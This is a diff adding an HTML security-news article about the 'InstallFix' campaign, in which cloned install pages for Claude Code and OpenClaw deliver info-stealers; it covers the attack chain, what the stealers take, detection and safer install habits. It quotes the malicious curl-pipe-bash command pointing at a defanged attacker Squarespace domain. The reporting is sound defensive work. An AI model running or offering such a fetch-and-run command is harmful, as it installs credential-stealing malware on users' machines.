@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Attackers are cloning developer CLI install pages to deliver info-stealers. Last week: fake OpenClaw (Vidar + GhostSocks). This week: fake Claude Code delivering Amatera Stealer via Google Ads. Here&#39;s how InstallFix works and how to protect yourself.">
+    <title>Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/installfix-fake-claude-code-fake-openclaw-amatera-stealer-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/installfix-fake-claude-code-fake-openclaw-amatera-stealer-2026/">
+    <meta property="og:title" content="Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign">
+    <meta property="og:description" content="Attackers are cloning developer CLI install pages to deliver info-stealers. Last week: fake OpenClaw (Vidar + GhostSocks). This week: fake Claude Code delivering Amatera Stealer via Google Ads. Here&#39;s how InstallFix works and how to protect yourself.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/installfix-fake-claude-code-fake-openclaw-amatera-stealer-2026/">
+    <meta name="twitter:title" content="Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign">
+    <meta name="twitter:description" content="Attackers are cloning developer CLI install pages to deliver info-stealers. Last week: fake OpenClaw (Vidar + GhostSocks). This week: fake Claude Code delivering Amatera Stealer via Google Ads. Here&#39;s how InstallFix works and how to protect yourself.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign",
+      "description": "Attackers are cloning developer CLI install pages to deliver info-stealers. Last week: fake OpenClaw (Vidar + GhostSocks). This week: fake Claude Code delivering Amatera Stealer via Google Ads. Here&#39;s how InstallFix works and how to protect yourself.",
+      "url": "https://bughuntertools.com/articles/installfix-fake-claude-code-fake-openclaw-amatera-stealer-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Fake Claude Code, Fake OpenClaw: The InstallFix Developer CLI Impersonation Campaign",
+  "description": "InstallFix is a ClickFix variant targeting developers with cloned CLI install pages. Two confirmed campaigns in one week: fake OpenClaw (Vidar + GhostSocks) and fake Claude Code (Amatera Stealer via Google Ads). Attack chain, IOCs, detection guidance.",
+  "datePublished": "2026-03-07",
+  "dateModified": "2026-03-07",
+  "author": { "@type": "Organization", "name": "Bug Hunter Tools", "url": "https://bughuntertools.com" },
+  "publisher": { "@type": "Organization", "name": "Bug Hunter Tools", "url": "https://bughuntertools.com" }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is InstallFix?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "InstallFix is a social engineering technique that clones legitimate developer CLI install pages and replaces the install command with a malicious curl-to-bash payload. All other links on the page redirect to the real legitimate site, so the victim has no visual indication anything is wrong. It is a variant of ClickFix, which uses fake browser error dialogs to trick users into running PowerShell commands. InstallFix specifically targets developers who are accustomed to curl-pipe-bash install patterns for tools like Homebrew, Node.js, and increasingly AI CLI tools."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How did Google Ads serve fake Claude Code to users?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Threat actors purchased Google Ads targeting the search query 'install claude code'. The ad promoted a malicious site (claude-code-cmd.squarespace.com, confirmed live as of March 7, 2026) built to visually impersonate Anthropic's official documentation. Because paid ads appear above organic results, the first link a developer saw was the malicious one. This is the same technique used in previous malvertising campaigns against Notepad++, 7-Zip, and Obsidian. The Squarespace domain gave the site a trusted TLD and SSL certificate, removing the most basic red flags."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is Amatera Stealer?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Amatera Stealer is a Malware-as-a-Service info-stealer based on ACR Stealer (itself a successor to Raccoon Stealer). It steals browser credentials and session cookies, cryptocurrency wallet files and seed phrases, saved passwords from system keystores, system information (hardware, OS, installed applications), and clipboard content. It has been delivered via App-V ClickFix script attacks previously. The fake Claude Code campaign appears to be among its first large-scale developer-targeted deployments. Amatera is sold as a subscription MaaS service — meaning any buyer can launch campaigns using the same payload."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How is the fake Claude Code campaign different on macOS vs Windows?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "On macOS, the fake install page delivers a base64-encoded curl command that downloads a shell script from an attacker-controlled domain, which in turn retrieves and executes Amatera Stealer. The base64 encoding bypasses simple command-line content inspection. On Windows, the attack uses mshta.exe (the Microsoft HTML Application Host) to retrieve and execute a remote HTA file containing the Amatera Stealer payload delivered via conhost.exe. Both execution paths operate without writing a traditional executable to disk, relying on Living Off the Land Binaries (LOLBins) to blend with normal system activity."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is the connection between the fake Claude Code and fake OpenClaw campaigns?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "BleepingComputer's coverage of the fake Claude Code campaign (March 6, 2026) explicitly references the fake OpenClaw campaign from the previous week (March 5, Huntress MDR discovery) as the precedent case. Both campaigns use the InstallFix technique: cloned developer install pages hosted on trusted infrastructure. Fake OpenClaw delivered Vidar stealer and GhostSocks backconnect proxy. Fake Claude Code delivered Amatera Stealer. The two campaigns confirm InstallFix is a repeatable playbook being used against developer tools with strong 'trust the curl command' brand associations."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I protect myself from InstallFix attacks?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Core defences: (1) Never install developer tools by clicking Google Ads — go directly to the official GitHub repository or documentation site. (2) Before running any curl-pipe-bash command, pipe to 'cat' first to inspect the script: 'curl https://example.com/install.sh | cat'. (3) Use a package manager (Homebrew, Scoop, winget) to install known tools from verified repositories rather than running remote scripts. (4) If you did run a suspicious command, assume credential compromise: rotate all saved browser passwords, revoke active session tokens for any accounts that were logged in, move any cryptocurrency funds immediately, and enable hardware security keys (FIDO2) for critical accounts."
+      }
+    }
+  ]
+}
+</script>
+
+<div class="key-takeaways" style="background: #f0f7ff; border-left: 4px solid #667eea; padding: 16px 20px; margin: 24px 0; border-radius: 0 4px 4px 0;">
+  <h2 style="margin-top: 0; font-size: 1.1rem;">Key Takeaways</h2>
+  <ul style="margin-bottom: 0;">
+    <li>Supply chain attacks target the tools and packages developers trust implicitly</li>
+    <li>Attackers increasingly use legitimate services as command-and-control infrastructure</li>
+    <li>Verify package integrity and monitor for unexpected network connections in your environment</li>
+  </ul>
+</div>
+
+
+<p style="color: #777; font-size: 0.9rem; margin-bottom: 24px;">
+    🚨 Breaking — March 7, 2026 &nbsp;|&nbsp; Sources: Push Security, BleepingComputer, Huntress MDR
+</p>
+
+<p style="font-size: 1.05rem; line-height: 1.7; margin-bottom: 20px;">
+    On March 5, Huntress MDR discovered attackers impersonating OpenClaw installers on GitHub, delivering Vidar stealer and a GhostSocks backconnect proxy to Windows users and Atomic Stealer to macOS users.
+</p>
+
+<p>One week later, the same playbook — with a different target. Push Security and BleepingComputer confirmed on March 6 that attackers are now impersonating <strong>Claude Code</strong>, Anthropic's AI coding assistant, via Google Ads malvertising. The payload this time is <strong>Amatera Stealer</strong>, a new Malware-as-a-Service info-stealer targeting browser credentials, session tokens, and cryptocurrency wallets.</p>
+
+<p>BleepingComputer explicitly cited the fake OpenClaw campaign as the precedent case. <a href="/articles/bing-ai-fake-openclaw-installer-vidar-stealer-ghostsocks/">We covered that campaign last week</a>. The pattern has a name now: <strong>InstallFix</strong>.</p>
+
+<h2>What Is InstallFix?</h2>
+
+<p>InstallFix is a social engineering technique, a close cousin to ClickFix, specifically designed to exploit developers' trust in <code>curl | bash</code> install patterns.</p>
+
+<p>ClickFix, which emerged in 2024, tricks non-technical users with fake browser error dialogs: "Your browser detected a problem — press Win+R and paste this command to fix it." The command runs PowerShell. The user never questions it because it looks like a real system error.</p>
+
+<p>InstallFix is the developer version of the same trick. Instead of a fake browser error, it clones the <em>actual installation documentation</em> for a real CLI tool. The page looks pixel-perfect — same fonts, same layout, same branding. Every link redirects to the real, legitimate site. The <em>only</em> thing that's different is the install command.</p>
+
+<p>It's subtle enough to fool experienced developers. If you search for "install claude code" on Google and the first result is a Squarespace site with Anthropic's branding, how long would you look before running the curl command?</p>
+
+<blockquote style="border-left: 4px solid #e74c3c; padding: 12px 20px; margin: 20px 0; background: #fff5f5; font-style: italic; color: #333;">
+"Just hosting malware on GitHub was enough" — Huntress MDR, describing how the fake OpenClaw repositories were promoted by Bing AI search without any active exploitation.
+</blockquote>
+
+<h2>Campaign 1: Fake OpenClaw (March 5)</h2>
+
+<p>The first confirmed InstallFix campaign targeted OpenClaw, the AI agent orchestration platform. (Note: <a href="https://github.com/openclaw/openclaw">the official OpenClaw repository</a> is at github.com/openclaw/openclaw — not any search result.)</p>
+
+<p>Huntress MDR discovered a fake GitHub organisation, <code>openclaw-installer</code>, that had copied legitimate Cloudflare Moltworker code to appear credible. The repositories were indexed and promoted by Bing AI's search results without any paid placement — just organic AI-recommended results.</p>
+
+<p><strong>Windows payload chain:</strong></p>
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li>Fake <code>OpenClaw_x64.exe</code> → Rust-based loader chain (executed in memory)</li>
+    <li><strong>Vidar Stealer</strong> — C2 infrastructure via Telegram and Steam profile pages (abuse of legitimate platforms to serve C2 config)</li>
+    <li><strong>GhostSocks</strong> — SOCKS5 backconnect proxy establishing persistent tunnel from victim machine to attacker infrastructure</li>
+</ul>
+
+<p><strong>macOS payload chain:</strong></p>
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li>Bash pastejacking → <code>puppeteerrr/dmg</code> repository</li>
+    <li><strong>Atomic Stealer (AMOS)</strong> — macOS-specific info-stealer targeting Keychain credentials, browser data, and crypto wallets</li>
+</ul>
+
+<p>The campaign was reported to GitHub. Removal status was unclear as of initial disclosure. The fake repositories leveraged GitHub's HTTPS certification to avoid the most basic browser warnings.</p>
+
+<h2>Campaign 2: Fake Claude Code — Amatera Stealer via Google Ads (March 6)</h2>
+
+<p>One week after the OpenClaw campaign, Push Security and BleepingComputer confirmed a second active InstallFix campaign targeting Claude Code.</p>
+
+<p>This campaign is more sophisticated in its delivery mechanism: instead of relying on search engine AI recommendations or organic results, it uses <strong>Google Ads malvertising</strong>. Paid ads targeting "install claude code" promoted a malicious Squarespace site — <code>claude-code-cmd.squarespace[.]com</code> — confirmed live as of March 7.</p>
+
+<p>Squarespace was chosen deliberately. It provides:</p>
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li>A trusted domain with valid SSL (no browser warnings)</li>
+    <li>Automatic CDN (fast load times that match legitimate documentation sites)</li>
+    <li>No IP reputation flags (Squarespace IPs are used by millions of legitimate sites)</li>
+    <li>Trusted enough to bypass many enterprise web proxies and content filters</li>
+</ul>
+
+<p>The same pattern also extended to deployments on <strong>Cloudflare Pages</strong> and <strong>Tencent EdgeOne</strong> — all legitimate content delivery platforms that attackers are weaponising as a trusted infrastructure bypass.</p>
+
+<h3>The Attack Chain</h3>
+
+<h4>macOS</h4>
+
+<p>The fake install page presents a command like:</p>
+
+<pre style="background: #1e1e2e; color: #cdd6f4; padding: 20px 24px; border-radius: 8px; font-family: monospace; overflow-x: auto; font-size: 0.87em; line-height: 1.65; border: 1px solid #313244;">curl -fsSL https://claude-code-cmd[.]squarespace[.]com/install.sh | bash</pre>
+
+<p>The install script is base64-encoded before delivery, making it opaque in logs and to shallow inspection. Once decoded and executed, it retrieves Amatera Stealer from a secondary attacker-controlled domain and executes it in memory.</p>
+
+<h4>Windows</h4>
+
+<p>On Windows, the attack leverages <code>mshta.exe</code> — Microsoft's HTML Application Host, a legitimate Windows binary used to run HTA (HTML Application) files. Mshta.exe is a <strong>Living Off the Land Binary (LOLBin)</strong> — a signed Microsoft binary that security tools trust.</p>
+
+<p>The infection chain:</p>
+<ol style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li>User runs the malicious install command from the fake page</li>
+    <li>Command invokes <code>mshta.exe</code> with a remote URL pointing to an HTA file</li>
+    <li>HTA file contains obfuscated VBScript/JavaScript that downloads Amatera Stealer</li>
+    <li>Payload executes via <code>conhost.exe</code> — another Windows LOLBin that blends with normal console activity</li>
+</ol>
+
+<p>Both delivery paths avoid writing a traditional <code>.exe</code> to disk. This defeats file-hash-based detection and many endpoint security tools that focus on executable drops rather than script execution chains.</p>
+
+<h2>Amatera Stealer: What It Takes</h2>
+
+<p>Amatera Stealer is a relatively new Malware-as-a-Service info-stealer believed to be derived from <strong>ACR Stealer</strong> (itself a continuation of the Raccoon Stealer lineage, whose original author was arrested in 2022).</p>
+
+<p>What Amatera steals:</p>
+
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><strong>Browser credentials</strong> — saved passwords from Chrome, Firefox, Edge, Brave, and derivatives. All major browser password stores are targeted.</li>
+    <li><strong>Session cookies</strong> — active authenticated sessions for web services. With a valid session cookie, an attacker can hijack an authenticated session <em>without needing the password</em>. This bypasses SMS 2FA entirely.</li>
+    <li><strong>Cryptocurrency wallets</strong> — wallet files, seed phrases, and private keys from MetaMask, Phantom, Exodus, and hardware wallet companion software</li>
+    <li><strong>System intelligence</strong> — hardware identifiers, installed applications, OS version — sufficient to build a fingerprint for account recovery social engineering</li>
+    <li><strong>Clipboard content</strong> — if you have a seed phrase or API key in your clipboard, it's exfiltrated immediately</li>
+</ul>
+
+<p>The MaaS model means Amatera is available to any buyer willing to pay a subscription fee. The fake Claude Code campaign may not be the work of a sophisticated nation-state actor — it could be a criminal group that rented the stealer for a few hundred dollars and bought $50 in Google Ads.</p>
+
+<p>This is the commoditisation of developer targeting. The attacker doesn't need to write malware. They need brand awareness of which developer tools people are currently installing.</p>
+
+<h2>Why This Pattern Works</h2>
+
+<p>Developer culture has a deeply embedded trust in <code>curl | bash</code>. The pattern was established by tools like Homebrew, Node Version Manager (nvm), Rust's rustup, and countless others. The security community has warned about this pattern for years — "never pipe to bash without reading the script first" — and yet it remains dominant because it genuinely is the most convenient install mechanism for cross-platform tooling.</p>
+
+<p>The InstallFix technique exploits three compounding factors:</p>
+
+<ol style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><strong>AI tool adoption urgency:</strong> Claude Code, OpenClaw, and similar tools are new and exciting. Developers want to install them quickly. They're less cautious with new tools than established ones.</li>
+    <li><strong>Search result trust:</strong> Developers implicitly trust the first result on Google and Bing. Google Ads at the top of the results page look identical to organic results in most browsers.</li>
+    <li><strong>Platform trust bypass:</strong> Squarespace and Cloudflare Pages are used by millions of legitimate businesses. No security tool flags them as suspicious. The HTTPS padlock is present. There are no browser warnings.</li>
+</ol>
+
+<p>The Bing AI angle (fake OpenClaw campaign) adds a fourth factor: AI-curated search results that recommend repositories without adequate provenance verification. An AI recommending a malicious GitHub repository is a much stronger endorsement than a normal search result — users trust AI curation.</p>
+
+<h2>Detection Guidance</h2>
+
+<h3>If You Think You May Have Run a Malicious Install Command</h3>
+
+<p>Assume full credential compromise and act accordingly:</p>
+
+<ol style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><strong>Rotate all browser-saved passwords immediately.</strong> Use your password manager's bulk-change feature if available. Prioritise: email accounts, banking, any service with cryptocurrency or payment methods.</li>
+    <li><strong>Revoke active session tokens.</strong> On all important accounts: log out all other sessions, revoke OAuth app authorisations, check for any new authorised applications or API tokens you didn't create.</li>
+    <li><strong>Move cryptocurrency assets.</strong> If you have any crypto holdings, transfer to a new wallet address <em>now</em>. A compromised seed phrase is an irreversible loss.</li>
+    <li><strong>Enable FIDO2 hardware keys on critical accounts.</strong> Unlike SMS OTP and authenticator-app TOTP, FIDO2 phishing-resistant MFA cannot be bypassed with stolen session cookies. A hardware security key would have protected you <em>even after</em> credential theft.</li>
+    <li><strong>Re-image the affected machine</strong> if any production credentials or secrets were stored on it. Amatera is primarily an info-stealer but the GhostSocks proxy (fake OpenClaw campaign) establishes persistent remote access.</li>
+</ol>
+
+<h3>Endpoint Detection</h3>
+
+<p>If you run EDR on developer machines (you should), look for:</p>
+
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><code>mshta.exe</code> spawning child processes or making outbound network connections</li>
+    <li><code>conhost.exe</code> with unusual parent processes or network connections</li>
+    <li><code>curl</code> or <code>bash</code> invocations with base64 arguments (especially <code>-d $(echo ... | base64 -d)</code> patterns)</li>
+    <li>Outbound connections to <code>squarespace.com</code> or <code>pages.dev</code> from developer CLI sessions (not from a browser)</li>
+    <li>Browser process spawning unusual child processes (Atomic Stealer often injects into browser processes on macOS)</li>
+</ul>
+
+<h3>Safer Install Patterns Going Forward</h3>
+
+<p>If you must run a curl-pipe-bash install, inspect the script first:</p>
+
+<pre style="background: #1e1e2e; color: #cdd6f4; padding: 20px 24px; border-radius: 8px; font-family: monospace; overflow-x: auto; font-size: 0.87em; line-height: 1.65; border: 1px solid #313244;"># ❌ What most people do (dangerous):
+curl -fsSL https://example.com/install.sh | bash
+
+# ✅ What you should do (safe):
+curl -fsSL https://example.com/install.sh -o install.sh
+cat install.sh        # read it first
+bash install.sh       # run it only if it looks legitimate</pre>
+
+<p>Better still: bookmark the official GitHub repository for every developer tool you use and only install from there. For AI CLI tools specifically, the official channels are:</p>
+
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><strong>Claude Code:</strong> <a href="https://github.com/anthropics/claude-code" rel="noopener">github.com/anthropics/claude-code</a> — only install via <code>npm install -g @anthropic-ai/claude-code</code> from the official npm package (published by <code>@anthropic-ai</code>)</li>
+    <li><strong>OpenClaw:</strong> <a href="https://github.com/openclaw/openclaw" rel="noopener">github.com/openclaw/openclaw</a> — official repository only</li>
+</ul>
+
+<h2>The Trend: AI Tool Impersonation Is Accelerating</h2>
+
+<p>In the past six months, security researchers have confirmed malvertising campaigns impersonating Notepad++, 7-Zip, WinRAR, Obsidian, Git, and now Claude Code and OpenClaw. The common thread: tools that developers and technically sophisticated users install frequently.</p>
+
+<p>The AI CLI category is especially attractive for attackers because:</p>
+
+<ol style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><strong>Novelty:</strong> New tools have less established "official install" muscle memory. Users are more likely to click the first result.</li>
+    <li><strong>Privileged installation:</strong> AI CLI tools typically request broad permissions (API key access, file system access, network access). Users accept these permissions as part of a normal install.</li>
+    <li><strong>High-value targets:</strong> Developers installing AI coding tools typically have: code repositories, cloud API keys, AWS/GCP credentials, SSH keys, and access to production systems. The expected credential yield per victim is higher than a typical consumer target.</li>
+    <li><strong>Low search literacy:</strong> "How do I install Claude Code?" is not a query that has an established, trusted answer in most users' minds. It's exactly the query type where a search result or AI recommendation carries disproportionate authority.</li>
+</ol>
+
+<p>The recommendation: treat all AI tool install instructions from search results with the same scepticism you'd apply to a random GitHub repository from an unknown author. Verify against the official project site directly. Check the npm/PyPI publisher is the official organisation. When in doubt, don't run it.</p>
+
+<hr style="margin: 40px 0; border: none; border-top: 1px solid #eee;">
+
+<h2>Recommended Security Resources</h2>
+
+<p>If you're hardening your developer environment against credential theft and session hijacking:</p>
+
+<ul style="margin: 16px 0 16px 24px; line-height: 1.9;">
+    <li><a href="https://www.amazon.co.uk/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470?tag=altclaw-20" rel="noopener"><em>The Web Application Hacker's Handbook</em></a> — the definitive guide to understanding web-based credential attacks, session management flaws, and how attackers chain techniques from initial access to account takeover</li>
+    <li><a href="https://www.amazon.co.uk/Black-Hat-Python-2nd-Programming/dp/1718501129?tag=altclaw-20" rel="noopener"><em>Black Hat Python, 2nd Edition</em></a> — covers the Python-based tooling behind most modern credential harvesters and info-stealers; essential reading for understanding what Amatera and Vidar are doing under the hood</li>
+    <li>A FIDO2 hardware security key — <a href="https://www.amazon.co.uk/Yubico-YubiKey-5C-NFC-Authentication/dp/B0BKLWL7LD?tag=altclaw-20" rel="noopener">YubiKey 5C NFC</a> for USB-C + NFC coverage, or <a href="https://www.amazon.co.uk/Yubico-YubiKey-5-NFC-Authentication/dp/B07HBD71HL?tag=altclaw-20" rel="noopener">YubiKey 5 NFC</a> for USB-A. FIDO2 is the only MFA method that survives session token theft — the key proves physical possession in real-time, not a code that can be relayed.</li>
+</ul>
+
+<hr style="margin: 40px 0; border: none; border-top: 1px solid #eee;">
+
+<div class="affiliate-disclosure" style="background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px 20px; margin: 30px 0; border-radius: 6px;">
+    <p style="margin: 0; color: #856404; font-size: 0.9rem;">💰 <strong>Affiliate disclosure:</strong> Links to Amazon products above use our affiliate tag (altclaw-20). If you purchase through these links, we receive a small commission at no extra cost to you. We only link to products we recommend for genuine security reasons.</p>
+</div>
+
+<section class="related-reading">
+  <h2>Related Reading</h2>
+  <ul>
+    <li><a href="/articles/bing-ai-fake-openclaw-installer-vidar-stealer-ghostsocks/">Bing AI Recommended a Fake OpenClaw Installer. It Delivered Vidar, GhostSocks, and Atomic Stealer.</a></li>
+    <li><a href="/articles/north-korea-stegabin-npm-pastebin-steganography-c2/">North Korea's StegaBin: 26 npm Packages Using Pastebin Steganography to Hide C2 Infrastructure</a></li>
+    <li><a href="/articles/model-distillation-attacks-deepseek-claude-anthropic-2026/">Model Distillation Attacks: How DeepSeek and Chinese AI Firms Extracted Claude at Industrial Scale</a></li>
+    <li><a href="/demos/securityclaw-gitleaks-secret-detection-demo-2026/">We Deleted the Key. Gitleaks Found It Anyway. Here's Why.</a></li>
+    <li><a href="/demos/securityclaw-supply-chain-scanner-demo-2026/">We Planted 7 Threats in a package.json. SecurityClaw Found All of Them in 0.19 Seconds.</a></li>
+  </ul>
+</section>
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
